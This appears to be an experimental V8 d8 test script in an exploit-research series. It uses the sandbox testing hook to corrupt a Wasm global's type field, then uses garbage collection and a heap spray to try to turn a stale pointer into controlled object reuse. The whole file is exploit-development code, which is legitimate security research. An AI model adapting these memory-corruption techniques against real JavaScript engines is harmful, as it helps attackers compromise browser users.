// C21 H4: try turning hidden ByteArray ref stale pointer into controlled reuse.
//
// H3 proves compaction can make the hidden pointer stale. This variant avoids
// immediate stress-compaction and sprays same-shape objects before reading.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kExternRefRawTypeSmi = 0x160a;

let builder = new WasmModuleBuilder();
builder.addGlobal(kWasmI64, true, false, [kExprI64Const, 0]).exportAs('g');
let instance = builder.instantiate();
let global = instance.exports.g;

Sandbox.corruptObjectField(global, 'raw_type', kExternRefRawTypeSmi);

(function() {
  let marker = {tag: 'dead', a: 1, b: 2, c: 3};
  global.value = marker;
  print(`initial=${global.value.tag}`);
})();

gc();

let spray = [];
for (let i = 0; i < 200000; i++) {
  spray.push({tag: 'spray', a: i, b: i ^ 0x5555, c: i ^ 0xaaaa});
}

gc();

let recovered = global.value;
print(`recovered_tag=${recovered && recovered.tag}`);
print(`recovered_a=${recovered && recovered.a}`);
